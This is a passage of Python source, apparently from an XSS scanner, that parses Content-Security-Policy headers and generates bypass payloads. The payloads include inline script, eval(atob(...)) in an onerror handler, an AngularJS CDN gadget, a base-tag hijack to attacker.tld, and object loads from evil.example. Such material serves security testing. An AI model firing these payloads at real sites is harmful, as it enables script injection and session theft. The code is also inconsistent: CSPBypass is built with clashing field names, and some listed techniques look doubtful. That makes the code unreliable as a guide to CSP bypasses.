            'payload': '<script>alert(1)</script><meta http-equiv="Content-Security-Policy" content="script-src \'none\'">',
            'description': 'Meta CSP is only enforced on elements after it in the DOM; anything before executes',
        },
        'uppercase_keyword_ignored': {
            'technique': 'Uppercase keyword ignored',
            'payload': "default-src 'self'; script-src 'UNSAFE-INLINE'",
            'description': "Browsers reject 'UNSAFE-INLINE' (uppercase) as an invalid source; policy looks enforced but is useless",
        },
        'multiple_headers_and': {
            'technique': 'Multiple CSP headers use AND semantics',
            'payload': 'CSP: default-src *\r\nCSP: script-src \'self\'',
            'description': 'Multiple CSP headers must all be satisfied (AND); the worst policy wins, not the best',
        },
        'comma_split_policy': {
            'technique': 'Comma-split policy in single header',
            'payload': 'CSP: default-src *; script-src \'self\', script-src *',
            'description': 'A comma in a directive value splits the policy — later directives override earlier ones in some parsers',
        },
        'legacy_x_webkit_csp': {
            'technique': 'Legacy X-Webkit-CSP header',
            'payload': 'X-WebKit-CSP: default-src \'self\'',
            'description': 'Modern browsers ignore the legacy header; a policy that ships only this is inert',
        },
        'legacy_x_csp': {
            'technique': 'Legacy X-Content-Security-Policy header',
            'payload': 'X-Content-Security-Policy: allow \'self\'',
            'description': 'Old Firefox syntax; ignored by modern browsers',
        },
        'ie_xss_filter': {
            'technique': 'IE X-XSS-Protection disable',
            'payload': 'X-XSS-Protection: 0',
            'description': 'Turning off the IE XSS filter + legacy CSP = no XSS defense',
        },
        'flash_crossdomain': {
            'technique': 'Legacy Flash / Silverlight object',
            'payload': '<object type="application/x-shockwave-flash" data="//evil.example/x.swf">',
            'description': "object-src must be 'none'; without it, Flash / Silverlight gadgets load",
        },
        'pdf_object_bypass': {
            'technique': 'PDF object with javascript:',
            'payload': '<object data="//evil.example/x.pdf" type="application/pdf">',
            'description': 'PDF viewers historically execute javascript: URIs; blocked only if object-src none',
        },
    }

    def __init__(self) -> None:
        self._cache: Dict[str, CSPAnalysis] = {}

    def parse_csp(self, csp_header: str) -> Dict[str, List[str]]:
        """Parse a CSP header into directive name -> list of tokens.

        Directive names are case-insensitive and duplicate directives are
        merged (browsers apply every occurrence), so the normalization happens
        here rather than at every call site.
        """
        directives: Dict[str, List[str]] = {}
        for directive in str(csp_header or "").split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            directive_name = parts[0].lower()
            values = parts[1:] if len(parts) > 1 else []
            if directive_name in directives:
                directives[directive_name].extend(values)
            else:
                directives[directive_name] = list(values)
        return directives

    def analyze_csp(self, csp_header: str) -> CSPAnalysis:
        """Analyze a CSP header for security issues."""
        if csp_header in self._cache:
            return self._cache[csp_header]

        directives = self.parse_csp(csp_header)
        issues: List[CSPIssue] = []
        bypasses: List[CSPBypass] = []

        # Effective script policy: `script-src` falls back to `default-src`.
        script_values = directives.get('script-src')
        if script_values is None:
            script_values = directives.get('default-src', [])
        normalized_script = [value.strip().strip("'\"").lower() for value in script_values]
        strict_dynamic = 'strict-dynamic' in normalized_script
        nonce_values = [
            value[len("nonce-"):]
            for value in normalized_script
            if value.startswith("nonce-")
        ]
        hash_present = any(
            value.startswith(("sha256-", "sha384-", "sha512-"))
            for value in normalized_script
        )
        # CSP3: with 'strict-dynamic' and a nonce/hash, browsers ignore both
        # host allowlists and 'unsafe-inline'.  Treating 'unsafe-inline' as a
        # direct bypass there is a false positive.
        strict_dynamic_trusted = strict_dynamic and bool(nonce_values or hash_present)

        # Check for a script policy at all.  Only one of the two directives is
        # required; `default-src` is the documented fallback.
        if 'script-src' not in directives and 'default-src' not in directives:
            issues.append(CSPIssue(
                issue_type="missing_directive",
                severity=CSPSeverity.HIGH,
                description="Missing script-src and default-src directives",
                directive="script-src",
                value=None,
            ))

        if strict_dynamic_trusted:
            issues.append(CSPIssue(
                issue_type="strict_dynamic",
                severity=CSPSeverity.INFO,
                description=(
                    "script-src uses 'strict-dynamic'; host allowlists and "
                    "'unsafe-inline' are ignored, so a trusted script gadget is "
                    "the remaining route to execution"
                ),
                directive="script-src",
                value="'strict-dynamic'",
            ))
            bypasses.append(CSPBypass(
                technique=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['technique'],
                payload_template=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['payload'],
                description=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['description'],
                target_directive=CSPDirective.SCRIPT_SRC,
                confidence=0.5,
            ))

        # Check for missing recommended directives
        for recommended in self.RECOMMENDED_DIRECTIVES:
            if recommended not in directives:
                issues.append(CSPIssue(
                    issue_type="missing_recommended_directive",
                    severity=CSPSeverity.MEDIUM,
                    description=f"Missing {recommended} directive (recommended)",
                    directive=recommended,
                    value=None,
                ))

        # `base-uri` is the one recommended directive that is independently
        # exploitable: an injected <base> re-points every relative script URL,
        # defeating a strict script-src host allowlist.
        if 'base-uri' not in directives:
            issues.append(CSPIssue(
                issue_type="missing_base_uri",
                severity=CSPSeverity.HIGH,
                description=(
                    "Missing base-uri allows <base> injection to hijack "
                    "relative script and stylesheet URLs"
                ),
                directive="base-uri",
                value=None,
            ))
            bypasses.append(CSPBypass(
                technique=self.BYPASS_TECHNIQUES['base_uri_hijack']['technique'],
                payload_template=self.BYPASS_TECHNIQUES['base_uri_hijack']['payload'],
                description=self.BYPASS_TECHNIQUES['base_uri_hijack']['description'],
                target_directive=CSPDirective.BASE_URI,
                confidence=0.8,
            ))

        # `object-src` falls back to `default-src`; report the bypass only when
        # the effective policy still permits data: or a wildcard.
        if 'object-src' not in directives:
            object_fallback = [
                value.strip().strip("'\"").lower()
                for value in directives.get('default-src', [])
            ]
            if not object_fallback or any(
                value in ('*', 'data:', 'http:', 'https:') for value in object_fallback
            ):
                bypasses.append(CSPBypass(
                    technique=self.BYPASS_TECHNIQUES['object_data']['technique'],
                    payload_template=self.BYPASS_TECHNIQUES['object_data']['payload'],
                    description=self.BYPASS_TECHNIQUES['object_data']['description'],
                    target_directive=CSPDirective.OBJECT_SRC,
                    confidence=0.6,
                ))

        # Weak or missing nonce entropy makes nonce-based strict CSP bypassable.
        for nonce in nonce_values:
            if len(nonce) < 16:
                issues.append(CSPIssue(
                    issue_type="weak_nonce",
                    severity=CSPSeverity.HIGH,
                    description=(
                        f"Nonce is only {len(nonce)} characters; short nonces are "
                        "guessable and are commonly reused across responses"
                    ),
                    directive="script-src",
                    value=f"nonce-{nonce}",
                ))
                bypasses.append(CSPBypass(
                    technique=self.BYPASS_TECHNIQUES['weak_nonce']['technique'],
                    payload_template=self.BYPASS_TECHNIQUES['weak_nonce']['payload'],
                    description=self.BYPASS_TECHNIQUES['weak_nonce']['description'],
                    target_directive=CSPDirective.SCRIPT_SRC,
                    confidence=0.6,
                ))
                break

        # Check for dangerous values
        for directive, values in directives.items():
            for value in values:
                raw_val = value.strip("'\"").lower()
                matched_dangerous = None
                for dangerous in self.DANGEROUS_VALUES:
                    if dangerous.endswith(':'):
                        if raw_val in (dangerous, dangerous + '*'):
                            matched_dangerous = dangerous
                            break
                    elif raw_val == dangerous or value == dangerous:
                        matched_dangerous = dangerous
                        break
                if matched_dangerous:
                    issues.append(CSPIssue(
                        issue_type="dangerous_value",
                        severity=(
                            CSPSeverity.LOW
                            if matched_dangerous == 'unsafe-inline' and strict_dynamic_trusted
                            else CSPSeverity.HIGH
                        ),
                        description=(
                            f"{directive} contains dangerous value: {matched_dangerous}"
                            + (
                                " (ignored because 'strict-dynamic' is active)"
                                if matched_dangerous == 'unsafe-inline' and strict_dynamic_trusted
                                else ""
                            )
                        ),
                        directive=directive,
                        value=value,
                    ))

                    if matched_dangerous == 'unsafe-inline':
                        if strict_dynamic_trusted:
                            continue
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['unsafe_inline']['technique'],
                            payload=self.BYPASS_TECHNIQUES['unsafe_inline']['payload'],
                            description=self.BYPASS_TECHNIQUES['unsafe_inline']['description'],
                            success_probability=0.9,
                        ))
                    elif matched_dangerous == 'unsafe-eval':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['unsafe_eval']['technique'],
                            payload=self.BYPASS_TECHNIQUES['unsafe_eval']['payload'],
                            description=self.BYPASS_TECHNIQUES['unsafe_eval']['description'],
                            target_directive=CSPDirective.SCRIPT_SRC,
                            confidence=0.7,
                        ))
                    elif matched_dangerous == '*':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['wildcard_origin']['technique'],
                            payload=self.BYPASS_TECHNIQUES['wildcard_origin']['payload'],
                            description=self.BYPASS_TECHNIQUES['wildcard_origin']['description'],
                            success_probability=0.8,
                        ))
                    elif matched_dangerous == 'data:':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['data_uri']['technique'],
                            payload=self.BYPASS_TECHNIQUES['data_uri']['payload'],
                            description=self.BYPASS_TECHNIQUES['data_uri']['description'],
                            success_probability=0.7,
                        ))

        # Check for JSONP gadget domains
        gadget_domains = ['ajax.googleapis.com', 'cdn.jsdelivr.net', 'cdnjs.cloudflare.com']
        for directive, values in directives.items():
            for value in values:
                for gadget in gadget_domains:
                    if _source_allows_host(value, gadget):
                        issues.append(CSPIssue(
                            issue_type="jsonp_gadget_domain",
                            severity=CSPSeverity.MEDIUM,
                            description=f"{directive} allows JSONP gadget domain: {gadget}",
                            directive=directive,
                            value=value,
                        ))
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['jsonp_gadget']['technique'],
                            payload=self.BYPASS_TECHNIQUES['jsonp_gadget']['payload'],
                            description=self.BYPASS_TECHNIQUES['jsonp_gadget']['description'],
                            success_probability=0.6,
                        ))

        bypass_possible = len(bypasses) > 0
        high_severity = any(
            issue.severity in (CSPSeverity.CRITICAL, CSPSeverity.HIGH) for issue in issues
        )
        is_strict = not bypass_possible and not high_severity

        analysis = CSPAnalysis(
            is_strict=is_strict,
            bypass_possible=bypass_possible,
            issues=issues,
            bypasses=bypasses,
            directives=directives,
            raw_csp=csp_header,
        )
        self._cache[csp_header] = analysis
        return analysis

    def suggest_bypass_payloads(
        self,
        analysis: CSPAnalysis,
        marker: str,
    ) -> List[str]:
        """Suggest potential CSP bypass payloads."""
        payloads: List[str] = []
        for bypass in analysis.bypasses:
            payload = bypass.payload.replace('alert(1)', f"window.__xoxss_csp.push('{marker}')")
            payloads.append(payload)
        return payloads

    def calculate_csp_score(self, analysis: CSPAnalysis) -> float:
        """Calculate overall CSP security score (0-1)."""
        if analysis.is_strict:
            return 1.0

        score = 1.0
        for issue in analysis.issues:
            if issue.severity == CSPSeverity.CRITICAL:
                score -= 0.3
            elif issue.severity == CSPSeverity.HIGH:
                score -= 0.2
            elif issue.severity == CSPSeverity.MEDIUM:
                score -= 0.1
            elif issue.severity == CSPSeverity.LOW:
                score -= 0.05

        score -= len(analysis.bypasses) * 0.15
        return max(0.0, round(score, 2))


class CSPBypassAutomator:
    """
    CSP bypass automation.
    Detects and tests CSP bypass techniques across directives.
    """

    BYPASS_TECHNIQUES = [
        CSPBypass(
            technique="data_uri",
            payload_template='data:text/javascript,{m}',
            description="data: URI script execution",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.8,
        ),
        CSPBypass(
            technique="json_gadget",
            payload_template='{"__proto__":{m}}',
            description="JSONP gadget via data URI",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.7,
        ),
        CSPBypass(
            technique="trusted_types_bypass",
            payload_template='<script type="trusted-types">{m}</script>',
            description="Trusted Types directive bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.6,
        ),
        CSPBypass(
            technique="nonce_prediction",
            payload_template='<script nonce="{nonce}">{m}</script>',
            description="Nonce prediction attack",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.5,
        ),
        CSPBypass(
            technique="hash_source_bypass",
            payload_template='<script src="{m}#sha256-abc..."></script>',
            description="Hash source bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.4,
        ),
        CSPBypass(
            technique="angular_cdn",
            payload_template='<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-csp>{m}</div>',
            description="Angular CSP bypass via CDN",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.9,
        ),
        CSPBypass(
            technique="base_tag_injection",
            payload_template='<base href="https://attacker.tld/">',
            description="Base tag injection for script loading",
            target_directive=CSPDirective.BASE_URI,
            confidence=0.8,
        ),
        CSPBypass(
            technique="iframe_sandbox",
            payload_template='<iframe sandbox="allow-scripts" srcdoc="{m}"></iframe>',
            description="iframe sandbox bypass",
            target_directive=CSPDirective.FRAME_SRC,
            confidence=0.7,
        ),
        CSPBypass(
            technique="object_data",
            payload_template='<object data="data:text/html,{m}"></object>',
            description="Object data URI bypass",
            target_directive=CSPDirective.OBJECT_SRC,
            confidence=0.8,
        ),
        CSPBypass(
            technique="style_attribute",
            payload_template='<div style="background:url({m})"></div>',
            description="Style attribute injection",
            target_directive=CSPDirective.STYLE_SRC,
            confidence=0.6,
        ),
        CSPBypass(
            technique="unsafe_eval",
            payload_template='<img src=x onerror="eval(atob(\'{m}\'))">',
            description="unsafe-eval permits dynamic code execution",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.7,
        ),
    ]

    def __init__(self) -> None:
        self._detected_bypasses: List[CSPBypass] = []

    def parse_csp(self, csp_header: str) -> Dict[CSPDirective, List[str]]:
        """Parse CSP header into directive enums."""
        csp: Dict[CSPDirective, List[str]] = {}
        if not csp_header:
            return csp
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if not parts:
                continue
            directive_name = parts[0].lower()
            try:
                directive_enum = CSPDirective(directive_name)
                csp[directive_enum] = parts[1:] if len(parts) > 1 else ['*']
            except ValueError:
                pass
        return csp

    def analyze_weaknesses(self, csp: Dict[CSPDirective, List[str]]) -> List[str]:
        """Analyze CSP for exploitable weaknesses."""
        weaknesses: List[str] = []
        script_src = csp.get(CSPDirective.SCRIPT_SRC, [])
        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])
        effective_script = script_src or default_src
        normalized_script = [
            str(value).strip().strip("'\"").lower() for value in effective_script
        ]
        if 'unsafe-inline' in normalized_script:
            if 'strict-dynamic' in normalized_script and any(
                value.startswith(("nonce-", "sha256-", "sha384-", "sha512-"))
                for value in normalized_script
            ):
                weaknesses.append(
                    "script-src sets unsafe-inline but 'strict-dynamic' makes "
                    "browsers ignore it (trusted-script gadget required)"
                )
            else:
                weaknesses.append("script-src allows unsafe-inline")
        if 'unsafe-eval' in normalized_script:
            weaknesses.append("script-src allows unsafe-eval")
        if '*' in normalized_script:
            weaknesses.append("script-src allows wildcard (*)")
        if not effective_script:
            weaknesses.append("No script-src or default-src directive")
        elif CSPDirective.SCRIPT_SRC not in csp and '*' in default_src:
            weaknesses.append("No script-src directive, falls back to permissive default-src")
        if CSPDirective.OBJECT_SRC not in csp:
            object_fallback = default_src
            if not object_fallback or any(
                str(value).strip().strip("'\"").lower() in ('*', 'data:', 'http:', 'https:')
                for value in object_fallback
            ):
                weaknesses.append("No object-src directive, object/embed may execute")
        if CSPDirective.BASE_URI not in csp:
            weaknesses.append(
                "No base-uri directive, <base> injection can hijack relative scripts"
            )
        for value in normalized_script:
            if value.startswith("nonce-") and len(value) - len("nonce-") < 16:
                weaknesses.append("Script nonce is short enough to be guessable/reused")
                break
        if CSPDirective.REPORT_URI in csp:
            weaknesses.append("Legacy report-uri directive present (may be XSS vector)")
        return weaknesses

    def get_applicable_bypasses(
        self,
        csp: Dict[CSPDirective, List[str]],
        marker: str = "xoxss",
    ) -> List[CSPBypass]:
        """Get applicable bypasses for the given CSP configuration."""
        applicable: List[CSPBypass] = []
        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])

        for bypass in self.BYPASS_TECHNIQUES:
            target_directive = bypass.target_directive or CSPDirective.SCRIPT_SRC

            # `base-uri` has no default-src fallback: its absence is the
            # weakness, so the technique applies whenever the directive is
            # missing (or explicitly allows an attacker-reachable host).
            if bypass.technique == "base_tag_injection":
                if target_directive not in csp:
                    applicable.append(bypass)
                continue

            # `object-src` does fall back to `default-src`; only a permissive
            # effective policy is exploitable.
            if bypass.technique == "object_data":
                object_values = csp.get(CSPDirective.OBJECT_SRC, default_src)
                if not object_values or any(
                    str(value).strip().strip("'\"").lower() in ('*', 'data:', 'http:', 'https:')
                    for value in object_values
                ):
                    applicable.append(bypass)
                continue

            values = csp.get(target_directive, default_src)
            if not values:
                continue
            if '*' in values:
                applicable.append(bypass)
                continue
            if bypass.technique == "data_uri" and any(
                _is_scheme_source(v, "data") for v in values
            ):
                applicable.append(bypass)
            elif bypass.technique == "angular_cdn" and any(
                _source_allows_host(v, "ajax.googleapis.com") for v in values
            ):
                applicable.append(bypass)
            elif bypass.technique == "unsafe_eval" and any(
                _is_csp_keyword(v, "unsafe-eval") for v in values
            ):
                applicable.append(bypass)
            elif bypass.technique == "iframe_sandbox" and any(
                _is_csp_keyword(v, "sandbox") for v in values
            ):
                applicable.append(bypass)

        return applicable

    def generate_bypass_payloads(
        self,
        bypasses: List[CSPBypass],
        marker: str,
        nonce: Optional[str] = None,
    ) -> List[str]:
        """Generate test payloads for applicable bypasses."""
        payloads: List[str] = []
        for bypass in bypasses:
            template = bypass.payload_template or bypass.payload
            payload = template.replace("{m}", marker)
            if nonce and "{nonce}" in payload:
                payload = payload.replace("{nonce}", nonce)
            payloads.append(payload)
        return payloads

    def test_nonce_prediction(self, html_content: str) -> Optional[str]:
        """Extract or predict script nonce from HTML content."""
        patterns = [
            r'nonce\s*=\s*["\']([^"\']+)["\']',
            r'<script[^>]*nonce=([a-zA-Z0-9+/=]+)',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                return matches[0]
        return None

    def generate_csp_report(self, csp: Dict[CSPDirective, List[str]]) -> str:
        """Generate human-readable summary of CSP directives."""
        report = ["Content-Security-Policy Analysis", ""]
        for directive, values in csp.items():
            report.append(f"{directive.value}: {', '.join(values)}")
        return "\n".join(report)


__all__ = [
    "CSPAnalysis",
    "CSPAnalyzer",
    "CSPBypass",
    "CSPBypassAutomator",
    "CSPDirective",
    "CSPIssue",
    "CSPSeverity",
]
